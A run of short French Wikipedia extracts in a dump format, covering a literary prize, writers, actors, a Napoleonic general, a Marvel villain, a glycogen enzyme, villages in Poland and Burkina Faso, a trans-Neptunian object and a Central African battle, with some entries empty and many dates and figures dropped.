Le prix des Critiques est un ancien prix littéraire français, créé en 1945 par Gonzague de Gestas de Lespéroux directeur des éditions du Pavois, récompensant des auteurs de langue française, dont le jury était composé de professionnels de l'édition, notamment des critiques littéraires, mais aussi de directeurs de revues et de magazines littéraires.

</doc>
<doc id="7902598" url="https://fr.wikipedia.org/wiki?curid=7902598" title="Brian Cleeve">
Brian Cleeve

Brian Cleeve, né le à Southend-on-Sea dans l’Essex en Angleterre et mort le à Shankill en Irlande, est un écrivain britannique, auteur de roman policier et d'espionnage.
Biographie.
Il fait ses études à la à Oxford de 1935 à 1938. Pendant la Seconde Guerre mondiale, il sert dans la marine marchande britannique. En 1948, il devient journaliste indépendant en Afrique du Sud jusqu'en 1954 tout en reprenant ses études à l'université de Pretoria. Son amitié avec lui fait découvrir la réalité de l'apartheid et les conditions de vie dans les townships comme ceux de Sophiatown. Ses critiques de l'apartheid font que les autorités le désignent comme « intraitable politique » et lui ordonnent de quitter l'Afrique du Sud. Il revient en Irlande en 1954 et étudie à l'université de Dublin pour obtenir en 1956 un doctorat en philosophie.
En 1952, il publie son premier roman "". Son premier roman policier "Birth of a Dark Soul" paraît en 1953 et son premier roman d’espionnage "L’I.S. au couvent" ("Assignment to Vengeance") en 1961. En 1964, il commence avec "Vote X for Treason" une série de quatre romans consacrée à Sean Ryan, ancien révolutionnaire irlandais sorti de prison par les services secrets anglais qui lui confient des missions d'infiltration dans des organisations menaçant la sécurité du Royaume-Uni. Seul le dernier roman est publié en français. Pour Claude Mesplède, dans "Sommeil de plomb". ("Violent Death of a Bitter Englishman"), 

</doc>
<doc id="7902600" url="https://fr.wikipedia.org/wiki?curid=7902600" title="Lycée follereau">
Lycée follereau



</doc>
<doc id="7902601" url="https://fr.wikipedia.org/wiki?curid=7902601" title="Kōhei Harumafuji">
Kōhei Harumafuji



</doc>
<doc id="7902604" url="https://fr.wikipedia.org/wiki?curid=7902604" title="Gyre de la mer de Ross">
Gyre de la mer de Ross

Le gyre de Ross est un gyre océanique proche de l'Antarctique, il se situe dans la mer de Ross. C'est un courant tournant dans le sens des aiguilles d'une montre formé par l'interaction du Courant circumpolaire antarctique sur le plateau continental de l'Antarctique. La banquise est persistante au centre du gyre. 

</doc>
<doc id="7902605" url="https://fr.wikipedia.org/wiki?curid=7902605" title="Güdingen">
Güdingen

Güdingen ("Guiding" ou "Goudange" en français) est un quartier de la ville allemande de Sarrebruck en Sarre. 
Géographie.
Güdingen est situé à environ 4 km au sud-est du centre-ville de Sarrebruck. Le cœur du quartier se trouve sur la rive droite de la Sarre tandis qu'une zone industrielle et un hippodrome sont installés sur la rive gauche. La limite sud-ouest de Güdingen est définie par la frontière franco-allemande avec la région historique de Lorraine et la commune de Grosbliederstroff. Les autres quartiers de Sarrebruck contigus sont Bübingen au sud-est, Brebach-Fechingen à l'est et Sankt Arnual au nord-ouest.
Histoire.
Le 1er janvier 1974, Güdingen qui était jusqu'alors une commune indépendante est intégré à la capitale sarroise Sarrebruck.

</doc>
<doc id="7902606" url="https://fr.wikipedia.org/wiki?curid=7902606" title="Akinori Asashōryū">
Akinori Asashōryū



</doc>
<doc id="7902610" url="https://fr.wikipedia.org/wiki?curid=7902610" title="Jolly (1776-1839)">
Jolly (1776-1839)

Jolly (parfois écrit "Joly" ; né Adrien Jean Baptiste Muffat le au Château du Raincy et mort le à Lormes, lieudit Grand-Pré) est un acteur de théâtre, graveur et librettiste français.
Biographie.
Né sur les domaines de Louis-Philippe d'Orléans, Adrien Jean Baptiste Muffat s'enrôle très jeune dans la cavalerie, mais est réformé à la suite d'une blessure. Il se place ensuite chez un marchand d'estampes. Il exécute des centaines d'illustrations pour des recueils publiés essentiellement chez Martinet, rue du Coq (Paris) et qu'il signe parfois « Adrien Joly ».
Il débute en 1802 au Théâtre Molière sous le nom de Joly (écrit aussi « Joli » ou « Jolly »). Il est cité dans des distributions au Théâtre du Marais, aux Délassements Comiques, aux Variétés-Montansier (1804), au Vaudeville (1808-1824) et aux Nouveautés (1825-29).
En 1812, il épouse Anne-Alexandrine Dherbez, dite Saint-Aubin, une actrice de l'Opéra-Comique.
La Bibliothèque nationale de France possède un recueil de 26 dessins représentant l'acteur Jolly signés Carle Vernet, Étienne Bouchardy et Anne-Louis Girodet.

</doc>
<doc id="7902614" url="https://fr.wikipedia.org/wiki?curid=7902614" title="Pierre-Yves Cardinal">
Pierre-Yves Cardinal

Pierre-Yves Cardinal, né le au Québec, au Canada, est un acteur canadien.
Il se fait connaître du public en 2014 dans "Tom à la ferme" de Xavier Dolan, rôle qui lui vaut une nomination aux prix Écrans canadiens.
Biographie.
Pierre-Yves Cardinal est né le au Québec, au Canada. Il étudie le théâtre en 2006 au Collège Lionel-Groulx situé à Sainte-Thérèse, au Canada.
Carrière.
Il commence sa carrière en 2006 avec la série "Kif-Kif". Il revient trois ans plus tard, avec un rôle dans les films "Polytechnique" de Denis Villeneuve et "Dédé, à travers les brumes" de Jean-Philippe Duval.
En 2011, il tourne dans les séries "Yamaska" et "19-2" (où il reviendra lors de deux épisodes en 2013).
En 2013, il joue dans la série "Trauma" et se fait connaître du grand public avec son rôle dans "Tom à la ferme" de Xavier Dolan. Il obtient une nomination au prix Écrans canadiens et une récompense en tant que meilleur acteur Festival 2 Valenciennes l'année suivante.
Toujours en 2014, il tourne de nouveau pour Xavier Dolan avec un petit rôle dans "Mommy". Il décroche également des rôles dans "Les Jeunes Loups "et "Nouvelle Adresse".
Après la fin de "Nouvelle Adresse", il joue de nouveau à la télévision dans "Le Clan", ainsi que dans les films "Le Garagiste" et "Anna".
En 2016, il joue dans le film du français Philippe Lioret : "Le Fils de Jean" avec Pierre Deladonchamps. À la télévision, il tourne dans "Prémonitions," "L'Échappée" et prête sa voix à la série d'animation "Mouvement Deluxe".
Entre 2017 et 2019, il joue aux côtés d'Evelyne Brochu dans la série "Trop.". L'année suivante, il joue dans "L'État sauvage" avec Alice Isaaz, Déborah François, Kevin Janssens, ou encore Bruno Todeschini.
En 2023, il incarne le rôle titre dans "Simple comme Sylvain" de Monia Chokri aux côtés de Magalie Lépine-Blondeau.

</doc>
<doc id="7902615" url="https://fr.wikipedia.org/wiki?curid=7902615" title="Les Tortues ninja (série de films)">
Les Tortues ninja (série de films)



</doc>
<doc id="7902618" url="https://fr.wikipedia.org/wiki?curid=7902618" title="Shiganosuke Akashi">
Shiganosuke Akashi



</doc>
<doc id="7902619" url="https://fr.wikipedia.org/wiki?curid=7902619" title="Vitali Jourov">
Vitali Jourov

Vitali Nikolaïevitch Jourov (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant. Il est international russe.
Palmarès.
Néant.

</doc>
<doc id="7902621" url="https://fr.wikipedia.org/wiki?curid=7902621" title="Pierre Yves Cardinal">
Pierre Yves Cardinal



</doc>
<doc id="7902622" url="https://fr.wikipedia.org/wiki?curid=7902622" title="Tarō Akebono">
Tarō Akebono



</doc>
<doc id="7902624" url="https://fr.wikipedia.org/wiki?curid=7902624" title="Giovanni La Via">
Giovanni La Via

Giovanni La Via (né le à Catane) est un homme politique italienne, élu député européen en 2009. Il est tour à tour membre du Peuple de la liberté, du Nouveau Centre-droit, d'Alternative populaire puis de Forza Italia.
Biographie.
Il est réélu député européen le avec de préférence, sur une liste NCD-Union de Centre.

</doc>
<doc id="7902625" url="https://fr.wikipedia.org/wiki?curid=7902625" title="Nicolas Marin Thiry">
Nicolas Marin Thiry

Nicolas Marin Thiry, né le à Lorquin et mort le à Paris, est un général français de la Révolution et de l’Empire.
Biographie.
Débuts de carrière, 1786-1802.
Il entre en service le , comme canonnier au régiment de Grenoble-artillerie, et le , il passe comme grenadier dans le Régiment Royal-Liégeois. Il est nommé sergent le , et il sert dans ce régiment jusqu’au mois d’, date de son licenciement. Le , il passe comme adjudant sous-officier dans les hussards de l’Égalité, et le décembre suivant il devient adjudant sous-lieutenant. Il fait ensuite la campagne à l’armée des Alpes sous les ordres du général Anne-Pierre de Montesquiou-Fézensac.
Il est promu capitaine le . Passé à l’armée du Nord, il se distingue à l’affaire de Blaton où, à la tête de 10 hussards, il s’empare de 2 obusiers, fait prisonniers les servants ainsi que l’officier qui les commandait. De l’an II à l’an IX, il sert aux armées de l’Ouest et d’Italie. Le , à l’affaire qui a lieu devant Quiberon, il traverse avec sa compagnie et met en déroute une colonne d’émigrés, dont 300 restent sur le champ de bataille. Il est nommé chef d’escadron le par le général en chef de l’armée d’Italie pour ses services, et est confirmé dans son grade par le Directoire le . Le , il reçoit un sabre d’honneur.
Du colonel des chasseurs à cheval de la Garde au général de brigade.
Pendant les ans XII et XIII, il tient garnison à Alexandrie et Rimini et est fait chevalier de la Légion d’honneur le , puis officier de l’ordre le . Le , il passe avec son grade dans les chasseurs à cheval de la Garde impériale, et il fait avec ce régiment les guerres de 1805 à 1807 en Autriche, en Prusse et en Pologne. Le à Austerlitz, il est grièvement blessé de deux coups de baïonnette à la poitrine, et le , à la bataille d'Eylau, il reçoit une forte contusion de boulet à la jambe gauche. Il est nommé colonel-major des chasseurs à cheval de la Garde impériale le , et est élevé au grade de commandeur de la Légion d’honneur le .
Il est promu général de brigade le , et il est créé baron de l’Empire le de la même année. Employé dans son nouveau grade à l’armée d’Illyrie, il y reste jusqu’au , époque de la suppression de cette armée, et il passe à celle d’Italie, qu’il quitte pour prendre part à la campagne de Russie. Le , à la bataille de la Moskova, il fait des prodiges de valeur : son cheval est tué sous lui et il reçoit trois blessures. Le , il est envoyé à la forteresse de Mayence, et le , il est attaché à la de marche du de cavalerie, puis le à la de cavalerie légère du de réserve de cavalerie. Le , il passe à la de cuirassiers et il continue de faire la guerre en Saxe et en France, plus particulièrement au combat de la Chaussée jusqu’au retour des Bourbons.
Fin de carrière.
Le , il est fait chevalier de Saint-Louis par le roi Louis XVIII, avant d'être appelé au commandement de l’arrondissement de Sarrelouis le suivant. Le , il est employé à Paris, et l’Empereur lui confie le commandement du département de la Meurthe le suivant. Au retour du roi, il est mis à la retraite le . Il est relevé de sa position de retraite, et il est placé dans le cadre des officiers généraux disponibles, puis admis définitivement à la retraite le . Il meurt le à Paris.
Armoiries.
- Coupé, le premier parti d'or au pal d'azur chargé de trois étoiles d'argent et de gueules au signe des barons tirés de l'armée ; le deuxième d'azur au cheval galopant d'or, accompagné en pointe d'un obus éclatant d'or, enflammé de gueules - Livrées : les couleurs de l'écu

</doc>
<doc id="7902629" url="https://fr.wikipedia.org/wiki?curid=7902629" title="Bataille de Kanagawa">
Bataille de Kanagawa

La bataille de Kanagawa se déroule au cours de l'époque Azuchi Momoyama () de l'histoire du Japon.
Le clan Go-Hōjō saisit l'occasion de la mort soudaine d'Oda Nobunaga pour lancer une attaque contre Takigawa Kazumasu, principal obligé de Nobunaga, qui a reçu des territoires après la défaite de Takeda Katsuyori cette même année 1582. Sur la frontière entre la province de Kōzuke et la province de Musashi, Kazumasu affronte les Hōjō à Kanegawa. Kazumasu dispose de soldats, tandis que les Hōjō en ont . Après sa défaite, Kazumasu se retire à Nagashima.

</doc>
<doc id="7902635" url="https://fr.wikipedia.org/wiki?curid=7902635" title="Ilia Tchibirov">
Ilia Tchibirov

Ilia Viktorovitch Tchibirov (en ) est un joueur russe de volley-ball né le . Il mesure et joue libero.
Palmarès.
Néant.

</doc>
<doc id="7902639" url="https://fr.wikipedia.org/wiki?curid=7902639" title="Kōji Takanohana">
Kōji Takanohana



</doc>
<doc id="7902642" url="https://fr.wikipedia.org/wiki?curid=7902642" title="Cathédrale de l'Assomption de Smolensk">
Cathédrale de l'Assomption de Smolensk



</doc>
<doc id="7902644" url="https://fr.wikipedia.org/wiki?curid=7902644" title="Flag-Smasher">
Flag-Smasher

Le Flag-Smasher est le nom de deux super-vilains successifs évoluant dans l'univers Marvel de la maison d’édition Marvel Comics. Créé par le scénariste Mark Gruenwald et le dessinateur Paul Neary, le personnage de fiction apparaît pour la première fois dans le comic book "Captain America" #312 en décembre 1985, sous l'identité de Karl Morgenthau.
En 2006, un autre Flag-Smasher est créé par le scénariste Zeb Wells et le dessinateur Stefano Caselli dans l'arc narratif "Civil War" ('), sous l'identité de Guy Thierrault.
Le Flag-Smasher est le leader d' (The Underground Liberated Totally Integrated Mobile Army To Unite Mankind), une faction anarchiste et anti-nationaliste. Le personnage original était le plus souvent un ennemi de Captain America, ses autres adversaires incluant le Punisher, Moon Knight, Ghost Rider, les Runaways, les Liberteens et Deadpool.
Un groupe appelé les Flag Smashers apparaît dans la série télévisée "Falcon et le Soldat de l'Hiver" (2021). Leur chef est une version féminine de l'incarnation de Karl Morgenthau, rebaptisée Karli Morgenthau (interprétée par l'actrice Erin Kellyman).
Pouvoirs, capacités et équipement.
Le Flag-Smasher est un brillant stratège terroriste. Bien qu'il ne possède aucun super-pouvoir, c'est un homme à la carrure athlétique doué pour le combat au corps à corps, avec une grande maîtrise de l'art martial du karaté shotokan. Il parle couramment l'anglais, le français, l'allemand, le russe, l'italien, le japonais et l'espéranto.
Le personnel d'ULTIMATUM lui a fourni un certain nombre d'armes et d'autres dispositifs, notamment un pistolet lance-flammes, un pistolet à gaz lacrymogène, une masse d’arme à pointes, un bouclier, des skis à réaction utilisés pour voler dans les airs, des dispositifs de téléportation, des sous-marins et un aéroglisseur propulsé par fusée.
Apparitions dans d'autres médias.
Télévision.
Interprétée par Erin Kellyman dans l'univers cinématographique Marvel :

</doc>
<doc id="7902647" url="https://fr.wikipedia.org/wiki?curid=7902647" title="Guédanga">
Guédanga

Guedanga est une commune rurale située dans le département de Ouo de la province de Comoé dans la région des Tannounyan au Burkina Faso.

</doc>
<doc id="7902653" url="https://fr.wikipedia.org/wiki?curid=7902653" title="Inzélé">
Inzélé

Inzele est une commune rurale située dans le département de Ouo de la province de Comoé dans la région des Tannounyan au Burkina Faso.

</doc>
<doc id="7902658" url="https://fr.wikipedia.org/wiki?curid=7902658" title="Kien">
Kien

Kien est un village du département et la commune rurale d'Ouo, situé dans la province de la Comoé et la région des Tannounyan au Burkina Faso.

</doc>
<doc id="7902661" url="https://fr.wikipedia.org/wiki?curid=7902661" title="K'Poum">
K'Poum

K'Poum est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902662" url="https://fr.wikipedia.org/wiki?curid=7902662" title="Techniques spatiales">
Techniques spatiales



</doc>
<doc id="7902665" url="https://fr.wikipedia.org/wiki?curid=7902665" title="Mado (Burkina Faso)">
Mado (Burkina Faso)

Mado est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902666" url="https://fr.wikipedia.org/wiki?curid=7902666" title="Cathédrale de la Dormition (Vladimir)">
Cathédrale de la Dormition (Vladimir)



</doc>
<doc id="7902667" url="https://fr.wikipedia.org/wiki?curid=7902667" title="Minsé">
Minsé

Minse est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902672" url="https://fr.wikipedia.org/wiki?curid=7902672" title="Nerkédaga">
Nerkédaga

Nerkédaga est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902674" url="https://fr.wikipedia.org/wiki?curid=7902674" title="Poikoro">
Poikoro

Poikoro est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902676" url="https://fr.wikipedia.org/wiki?curid=7902676" title="Sokourani (Ouo)">
Sokourani (Ouo)

Sokourani est une commune rurale située dans le département de Ouo de la province de Comoé dans la région de Tannounyan au Burkina Faso.

</doc>
<doc id="7902680" url="https://fr.wikipedia.org/wiki?curid=7902680" title="L·l (digramme)">
L·l (digramme)



</doc>
<doc id="7902690" url="https://fr.wikipedia.org/wiki?curid=7902690" title="Style Pompadour">
Style Pompadour



</doc>
<doc id="7902694" url="https://fr.wikipedia.org/wiki?curid=7902694" title="Enzyme de débranchement du glycogène">
Enzyme de débranchement du glycogène

L'enzyme de débranchement du glycogène (GDE) est un système enzymatique regroupant une activité glycosyltransférase et une activité glycoside hydrolase qui facilite la dégradation du glycogène stocké dans le foie et les muscles en libérant du glucose avec l'aide de phosphorylases. Il s'agit d'une source d'énergie essentielle chez de nombreux êtres vivants. Cette voie métabolique est régulée dans l'organisme, particulièrement dans le foie, sous l'action de diverses hormones telles que l'insuline et le glucagon&lt;ref name="10.1111/j.1432-1033.1967.tb00133.x"&gt;
&lt;/ref&gt;. Cette régulation très étroite assure l'homéostasie de la glycémie. Les désordres métaboliques résultant de mutations affectant l'enzyme de débranchement du glycogène peuvent conduire par exemple à une glycogénose&lt;ref name="10.1002/prot.22697"&gt;
&lt;/ref&gt;&lt;ref name="10.1006/geno.1996.0611"&gt;
&lt;/ref&gt;.
Les deux activités enzymatiques constituant l'enzyme de débranchement du glycogène sont réalisées par une protéine unique chez les mammifères, les levures et certaines bactéries, mais par deux protéines distinctes chez "" et d'autres bactéries, ce qui complique la nomenclature. Les protéines qui possèdent les deux activités enzymatiques sont appelées "enzymes de débranchement du glycogène" (GDE), tandis que cette appellation est généralement réservée à la glycoside transférase dans les systèmes à deux enzymes distinctes. Chez certains auteurs, une enzyme qui ne possède qu'une activité glycoside transférase est appelée "enzyme de débranchement"&lt;ref name="10.1074/jbc.M802560200"&gt;
&lt;/ref&gt;.
Rôle métabolique.
La glycogène phosphorylase () est la principale enzyme impliquée dans la dégradation du glycogène, dont elle détache du glucose-1-phosphate lié par une :
Cette enzyme est en revanche bloquée à hauteur de quatre résidus de glucose en amont des liaisons , qui sont celle des ramifications du glycogène ; il faut alors l'intervention d'une enzyme de débranchement du glycogène pour permettre à la glycogène phosphorylase de poursuivre le clivage des liaisons sans être arrêtée par la présence des liaisons &lt;ref name="10.1016/j.jmb.2008.03.016"&gt;
&lt;/ref&gt; :
Structure.
Selon les espèces, l'enzyme de débranchement du glycogène est constituée de deux enzymes distinctes ou d'une seule protéine possédant deux sites actifs distincts.
Deux enzymes distinctes.
Chez "E. coli" et d'autres bactéries, les activités glycosyltransférase et glycoside hydrolase sont portées par deux enzymes distinctes. Le transfert du glucose est assuré chez "" par la 4-α-glucanotransférase, une protéine de codée par le gène "malQ". Une seconde protéine de codée par le gène "glgX", appelée "enzyme de débranchement", réalise le clivage des liaisons.
L'activité de ces deux enzymes n'est pas nécessairement couplée : l'enzyme de débranchement d' catalyse le clivage de branches de glycogène en fragments de quatre résidus de glucose sans activité glycosyltransférase, fragments qui sont ensuite dégradés par la maltodextrine phosphorylase&lt;ref name="10.1128/JB.187.4.1465-1473.2005"&gt;
&lt;/ref&gt;. La structure de cette dernière enzyme est semblable à celle de l'isoamylase, protéine monomérique possédant un domaine central contenant huit et entouré par huit avec une fosse longue de et large de riche en résidus d'acides aminés aromatiques dont on pense qu'ils stabilisent le brin de glycogène à quatre résidus de glucose avant clivage.
Protéine unique avec deux sites actifs.
Chez les levures et les mammifères, une protéine unique possède les deux activités enzymatiques de débranchement&lt;ref name="10.1074/jbc.M102192200"&gt;
&lt;/ref&gt;. L'enzyme de débranchement du glycogène humaine, codée par le gène "AGL", est un monomère de masse moléculaire . On a pu montrer que les deux fonctions catalytiques de cette protéine peuvent fonctionner indépendamment l'une de l'autre, ce qui démontre la présence de plusieurs sites actifs distincts. Ce résultat a été confirmé par l'existence d'inhibiteurs spécifiques à l'une des deux activités enzymatiques, tels que la polyhydroxylamine qui inhibe sélectivement l'activité glycoside hydrolase sans affecter l'activité glycosyltransférase de manière mesurable. L'enzyme de débranchement du glycogène est la seule enzyme d'eucaryote connue possédant plusieurs sites actifs distincts et active comme monomère.
Certaines études ont montré que le côté de l'enzyme de levure est associée à l'activité glycoside hydrolase tandis que le côté est associée à l'activité glycosyltransférase. Outre ces deux sites actifs, l'enzyme paraît également posséder un troisième site lui permettant de se lier au glycogène.

</doc>
<doc id="7902695" url="https://fr.wikipedia.org/wiki?curid=7902695" title="Hornówek">
Hornówek



</doc>
<doc id="7902701" url="https://fr.wikipedia.org/wiki?curid=7902701" title="Laski (Varsovie-ouest)">
Laski (Varsovie-ouest)

Laski [ˈlaski] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de habitants en 2000.

</doc>
<doc id="7902707" url="https://fr.wikipedia.org/wiki?curid=7902707" title="Egor Logunov">
Egor Logunov

Iegor Logounov (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.
Palmarès.
Equipe nationale -23 ans

</doc>
<doc id="7902709" url="https://fr.wikipedia.org/wiki?curid=7902709" title="Mościska (Varsovie-ouest)">
Mościska (Varsovie-ouest)

Mościska [mɔɕˈt͡ɕiska] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au sud-est d'Izabelin (chef-lieu), 9 kilomètress au nord-est de Ożarów Mazowiecki et à 12 kilomètres au nord-ouest de Varsovie.
Le village a une population de 442 habitants en 2000.

</doc>
<doc id="7902717" url="https://fr.wikipedia.org/wiki?curid=7902717" title="Sieraków (Varsovie-ouest)">
Sieraków (Varsovie-ouest)

Sieraków [ɕeˈrakuf] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 2 kilomètres au nord d'Izabelin (chef-lieu), 12 kilomètress au nord de Ożarów Mazowiecki et à 14 kilomètres au nord-ouest de Varsovie.
Le village a une population de 389 habitants en 2000.

</doc>
<doc id="7902720" url="https://fr.wikipedia.org/wiki?curid=7902720" title="Sieraków">
Sieraków

Sieraków peut faire référence à :

</doc>
<doc id="7902727" url="https://fr.wikipedia.org/wiki?curid=7902727" title="Léopold Caldani">
Léopold Caldani

Léopold Caldani, en latin Leopoldus Marcus Antonius Caldanius, de son nom complet en italien Leopoldo Marco Antonio Caldani, né à Bologne en 1725 et décédé en 1813 à Padoue, est un anatomiste et physiologiste italien. Il introduisit l'électricité pour étudier la physiologie du système nerveux.
Biographie.
Né à Bologne le 21 novembre 1725, Caldani арpartenait à une famille originaire de Modène. Il étudia à Bologne, reçut son diplôme en 1750.
Malgré sa jeunesse, il ne tarda pas à acquérir la réputation d’un praticien habile. Il fut admis parmi les membres de l'Académie des sciences de l'institut de Bologne et, en 1755, il devint professeur de médecine appliquée. C’est alors qu’il entr prit une longue série d’expériences pour vérifier les observations de Haller à l’égard des parties irritables et sensibles du corps. Mais les succès qu’il obtint comme professeur et comme expérimentateur lui suscitèrent des désagréments et le déterminèrent à quitter Bologne pour Padoue, où il devint professeur de médecine théorique à l'université.
Dix ans après, en 1771, il remplaça Morgagni dans la chaire d'anatomie de l'Université de Padoue. Caldani mourut à Paris le 30 décembre 1813

</doc>
<doc id="7902729" url="https://fr.wikipedia.org/wiki?curid=7902729" title="Andreï Kolesnik">
Andreï Kolesnik

Andreï Vladimirovitch Kolesnik (en ) est un joueur russe de volley-ball né le . Il mesure et joue attaquant. Il totalise 35 sélections en équipe de Russie.

</doc>
<doc id="7902732" url="https://fr.wikipedia.org/wiki?curid=7902732" title="Averell Dalton">
Averell Dalton



</doc>
<doc id="7902735" url="https://fr.wikipedia.org/wiki?curid=7902735" title="(385446) Manwë">
(385446) Manwë

(385446) Manwë est un objet transneptunien découvert le par Marc W. Buie au Cerro Tololo Inter-American Observatory. Sa désignation provisoire était .
Caractéristiques.
C'est un astéroïde hadéocroiseur (son orbite croise celle de (134340) Pluton).
Il a été considéré comme un cubewano puis comme en résonance 4:7 avec Neptune.
Manwë mesure de diamètre.
Satellite.
Il possède une lune nommée Thorondor, dont le nom provisoire était , qui mesure et orbite à du centre de gravité du système Manwë.
Étymologie.
Il est nommé d'après Manwë, personnage de l'univers de J. R. R. Tolkien.

</doc>
<doc id="7902736" url="https://fr.wikipedia.org/wiki?curid=7902736" title="Angelo Attaguile">
Angelo Attaguile

Angelo Attaguile (né le à Grammichele) est un homme politique italien, membre du Mouvement pour les autonomies, puis de la Ligue du Nord à partir de 2015.
Biographie.
Fils du sénateur et ministre , Angelo Attaguile a été responsable national du mouvement jeunesse de la Démocratie chrétienne.
De 1987 à 1990, il a présidé le Calcio Catane. Il est élu député en Campanie les 24 et , dans la liste du Peuple de la liberté. Il s'inscrit au groupe parlementaire de la Ligue du Nord le .
En , Matteo Salvini, secrétaire fédéral de la Ligue du Nord annonce lors d'une conférence de presse la naissance de Noi con Salvini, un mouvement politique destiné à enraciner les idées de la Ligue dans le Centre et le Midi italiens. Le , Angelo Attaguile en est nommé secrétaire national et coordinateur pour la Sicile. Il quitte alors le Mouvement pour les autonomies.

</doc>
<doc id="7902753" url="https://fr.wikipedia.org/wiki?curid=7902753" title="Truskaw">
Truskaw

Truskaw [ˈtruskaf] est un village polonais, situé dans la gmina d'Izabelin de la Powiat de Varsovie-ouest dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 3 kilomètres à l'ouest d'Izabelin (chef-lieu), 10 kilomètress au nord de Ożarów Mazowiecki et à 18 kilomètres au nord-ouest de Varsovie.
Histoire.
Le village a une population de habitants en 2000.

</doc>
<doc id="7902754" url="https://fr.wikipedia.org/wiki?curid=7902754" title="Rajena">
Rajena

Rajena (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902760" url="https://fr.wikipedia.org/wiki?curid=7902760" title="Thorondor (lune)">
Thorondor (lune)

Thorondor, officiellement , est un objet transneptunien, satellite de (385446) Manwë. Sa désignation provisoire était .
Caractéristiques.
Thorondor mesure et orbite à de Manwë.
Étymologie.
Il est nommé d'après Thorondor, serviteur de Manwë.

</doc>
<doc id="7902761" url="https://fr.wikipedia.org/wiki?curid=7902761" title="Claudio Borghi (homme politique)">
Claudio Borghi (homme politique)

Claudio Borghi (né le à Milan) est un homme politique et un économiste italien, député la circonscription de Pise-Livourne-Poggibonsi' (en Toscane) avec la Ligue de Matteo Salvini aux élections du 4 mars 2018. 
Biographie.
Claudio Borghi vit et travaille à Milan, où il a été enseignant vacataire auprès de l'université catholique du Sacré-Cœur. Il est l'auteur du livre "Investire nell'arte", Sperling &amp; Kupfer . 
Il est connu pour ses positions contre l'euro et avec Alberto Bagnai il est un de plus connus et actifs personnage public anti-euro italiens.
Président de la commission des finances à la Chambre des députés de 2018 à 2020, il propose l’instauration de « minibots », mini bons du Trésor, qui seraient émis sous forme monétaire, avec des petites coupures au porteur.

</doc>
<doc id="7902769" url="https://fr.wikipedia.org/wiki?curid=7902769" title="2003 QW111">
2003 QW111



</doc>
<doc id="7902770" url="https://fr.wikipedia.org/wiki?curid=7902770" title="(385446) 2003 QW111">
(385446) 2003 QW111



</doc>
<doc id="7902775" url="https://fr.wikipedia.org/wiki?curid=7902775" title="Parc éolien du Massif du Sud">
Parc éolien du Massif du Sud

Le parc éolien du Massif du Sud est situé en grande partie dans le parc régional du Massif du Sud, sur des terres privées () et sur des terres publiques () de quatre municipalités : Saint-Luc-de-Bellechasse, Saint-Magloire (MRC des Etchemins), Saint-Philémon et Notre-Dame-Auxiliatrice-de-Buckland (MRC de Bellechasse).
Le projet est un des quinze retenus dans le cadre du d'offres d'Hydro-Québec Distribution (2005). L'énergie produite par les éoliennes de ce parc est raccordée au réseau via une ligne à de reliant le poste du promoteur vers celui situé à Lac-Etchemin . Le parc est actuellement la propriété de EDF Énergies Renouvelables de Enbridge. Un contrat de vingt ans lie les propriétaires et Hydro-Québec Distribution.
Caractéristiques du parc.
La construction a débuté à l'automne 2011 et l'ouverture complète du parc a eu lieu le . 
Le parc, d'une puissance de , compte de chacune qui sont dispersées sur le territoire . Ces dernières ont été fabriquées par la compagnie allemande REpower. Les pales, les tours et les convertisseurs ont été fabriqués au Québec.

</doc>
<doc id="7902778" url="https://fr.wikipedia.org/wiki?curid=7902778" title="Ratu (Népal)">
Ratu (Népal)

Ratu (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7902785" url="https://fr.wikipedia.org/wiki?curid=7902785" title="Bübingen">
Bübingen

Bübingen est un quartier de la ville allemande de Sarrebruck en Sarre.
Histoire.
Le village est mentionné pour la première fois en 1310 sous le nom de "Bibingen" ou "Bybinga".

</doc>
<doc id="7902792" url="https://fr.wikipedia.org/wiki?curid=7902792" title="Premier combat de Grimari">
Premier combat de Grimari

Le combat de Grimari se déroule pendant la guerre civile de Centrafrique.
Déroulement.
Le , à Grimari, en République centrafricaine, un combat éclate opposant Seleka et Anti-Balaka. Au petit matin, des incendies se déclarent dans la zone dite du « quartier musulman » à l'ouest de la ville. Une patrouille de la force Sangaris, alors à proximité, intervient et tente de s'interposer. Des échanges de tir à l'arme légère éclatent, menaçant les populations civiles encore présente sur la zone, bien que le quartier ait été déserté dans sa majorité les jours précédents. Des hommes appartenant à la milice des Anti-Balaka sont clairement identifiés par la force Sangaris. Ces évènements marquent le début du premier combat de Grimari.
La plupart des habitants de la petite ville s'enfuient dans la brousse ou trouvent refuge dans la mission catholique. chrétiens se rassemblent à la paroisse de Notre-Dame de la Liesse.
Lors des affrontements, un contingent français de l'Opération Sangaris est présent à Grimari, le ministère de la Défense déclare : .
Selon Wendy Rappeport, porte-parole du bureau africain du Haut Commissariat des Nations unies pour les réfugiés (HCR), les Anti-balaka prennent l'avantage et s'emparent de la ville. Cette version est contestée par l'armée française, qui laisse sur place des effectifs importants ainsi que l'envoi de renforts terriens et aériens venus du Tchad voisin.
Les combats cessent le . Ce jour-là les Anti-Balaka font mouvement sur la ville, cependant le lendemain des combattants Seleka effectuent une nouvelle incursion sur la ville.
Les pertes.
